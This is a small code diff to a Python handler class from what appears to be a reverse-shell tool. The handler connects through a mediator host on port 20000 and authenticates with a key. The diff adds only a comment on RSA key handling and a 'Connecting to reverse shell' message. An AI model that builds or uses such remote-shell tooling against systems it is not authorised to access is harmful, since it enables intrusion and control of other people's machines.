@@ -66,6 +66,7 @@ class Handler:
                 print(response.decode(), end="", flush=True)
 
     def getRSA(self):
+        # read RSA key if it exists, otherwise create a new one
         try:
             keyFile = open("handler.pem", "rb")
             key = keyFile.read()
@@ -94,6 +95,7 @@ class Handler:
 
     def connect(self, mediatorHost):
         # connect to moderator on operator port
+        print("Connecting to reverse shell...")
         self.shell.connect((gethostbyname(mediatorHost), 20000))
         # send verification
         self.shell.sendall(self.connectionKey.encode())
